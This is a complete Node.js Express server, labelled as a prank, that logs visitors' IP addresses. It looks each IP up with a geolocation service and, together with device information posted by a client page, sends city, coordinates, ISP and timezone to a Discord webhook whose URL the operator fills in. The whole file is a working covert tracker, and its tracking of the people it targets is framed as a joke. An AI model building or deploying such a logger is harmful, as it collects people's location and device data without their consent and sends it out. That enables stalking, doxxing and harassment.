const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// REPLACE THIS WITH YOUR REAL DISCORD WEBHOOK URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN_HERE';

// In-memory last data per user (resets on restart, fine for prank)
const lastData = {};

app.post('/log', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

  const userID = req.body.userID || 'unknown';
  const deviceInfo = req.body.deviceInfo || {};

  try {
    const geoResp = await axios.get(`https://ipapi.co/${ip}/json/`);
    const geo = geoResp.data;
    if (geo.error) throw new Error(geo.reason || 'Geo fail');

    const fullInfo = {
      ip,
      city: geo.city || '???',
      region: geo.region || '???',
      country: geo.country_name || '???',
      lat: geo.latitude?.toFixed(3) || '???',
      lon: geo.longitude?.toFixed(3) || '???',
      timezone: geo.timezone || '???',
      isp: geo.org || '???',
      ...deviceInfo
    };

    const last = lastData[userID];
    if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
      await axios.post(DISCORD_WEBHOOK, {
        content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
          Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
      });
    }

    lastData[userID] = fullInfo;
    res.json(fullInfo);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/', (req, res) => res.send('Prank server running!'));

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Running on port ${port}`));
